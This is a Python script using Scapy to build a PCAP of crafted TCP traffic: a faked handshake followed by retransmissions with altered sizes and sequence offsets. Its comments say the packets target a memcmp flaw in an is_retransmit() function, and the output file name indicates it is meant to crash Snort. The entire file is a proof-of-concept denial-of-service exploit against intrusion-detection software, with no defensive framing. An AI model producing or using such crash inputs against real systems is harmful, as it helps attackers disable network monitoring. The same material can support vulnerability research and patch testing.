#!/usr/bin/env python3
from scapy.all import *
import random
import os

# Set up the IP addresses and ports
src_ip = "192.168.1.100"
dst_ip = "192.168.1.200" 
src_port = 12345
dst_port = 80

# Initial sequence numbers
client_isn = random.randint(1000000000, 2000000000)
server_isn = random.randint(1000000000, 2000000000)

packets = []

# TCP 3-way handshake
syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=client_isn)
packets.append(syn)

syn_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="SA", 
             seq=server_isn, ack=client_isn+1)
packets.append(syn_ack)

ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="A", 
         seq=client_isn+1, ack=server_isn+1)
packets.append(ack)

# Base sequence for data
base_seq = client_isn + 1
current_seq = base_seq

# We'll focus on retransmission attacks since the vulnerability is related to how
# retransmitted packets are handled in is_retransmit() function

# Create a large initial segment (baseline)
payload_size = 1460  # TCP MSS
payload = os.urandom(payload_size)  # Random data
pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
        seq=current_seq, ack=server_isn+1)/Raw(load=payload)
packets.append(pkt)

# Server ACK
ack1 = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
        seq=server_isn+1, ack=current_seq+payload_size)
packets.append(ack1)
current_seq += payload_size

# Now create retransmissions with manipulated sizes to target the memcmp vulnerability
# We'll create a sequence of retransmits with carefully crafted sizes to potentially
# trigger the vulnerability in is_retransmit()

for i in range(1, 20):  # Try several iterations
    # Original packet with specific sequence
    seq_num = current_seq
    orig_size = 1400 + i  # Size that will be just under the MSS
    orig_payload = os.urandom(orig_size)
    
    pkt_orig = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=seq_num, ack=server_isn+1)/Raw(load=orig_payload)
    packets.append(pkt_orig)
    
    # Server ACK
    ack_orig = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
              seq=server_isn+1, ack=seq_num+orig_size)
    packets.append(ack_orig)
    
    # Now send what appears to be retransmissions but with manipulated sizes
    # This targets the comparison logic in is_retransmit()
    
    # Case 1: Same sequence but smaller size (targets the cmp_len calculation)
    retrans_size1 = orig_size - 5
    retrans_payload1 = orig_payload[:retrans_size1]  # Use part of the original payload
    
    pkt_retrans1 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
                   seq=seq_num, ack=server_isn+1)/Raw(load=retrans_payload1)
    packets.append(pkt_retrans1)
    
    # Case 2: Same sequence but larger size (potentially overflows buffer)
    retrans_size2 = orig_size + 10
    # Start with original payload and add more data
    retrans_payload2 = orig_payload + os.urandom(10)
    
    pkt_retrans2 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
                   seq=seq_num, ack=server_isn+1)/Raw(load=retrans_payload2)
    packets.append(pkt_retrans2)
    
    # Case 3: Slightly offset sequence for edge cases in sequence comparison
    offset_seq = seq_num + 1
    pkt_retrans3 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
                   seq=offset_seq, ack=server_isn+1)/Raw(load=retrans_payload1)
    packets.append(pkt_retrans3)
    
    # Move to next segment
    current_seq += orig_size

# Create out-of-order segments to further complicate reassembly
for i in range(10):
    # Use random positioning within our established sequence range
    rand_seq = base_seq + random.randint(0, current_seq - base_seq)
    rand_size = random.randint(100, 1400)
    rand_payload = os.urandom(rand_size)
    
    pkt_random = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
                 seq=rand_seq, ack=server_isn+1)/Raw(load=rand_payload)
    packets.append(pkt_random)

# End with a FIN to close connection
fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="FA", 
         seq=current_seq, ack=server_isn+1)
packets.append(fin)

fin_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="FA", 
             seq=server_isn+1, ack=current_seq+1)
packets.append(fin_ack)

# Write to PCAP
wrpcap("snort_tcp_retransmit_crash.pcap", packets)
print(f"Created PCAP with {len(packets)} packets")
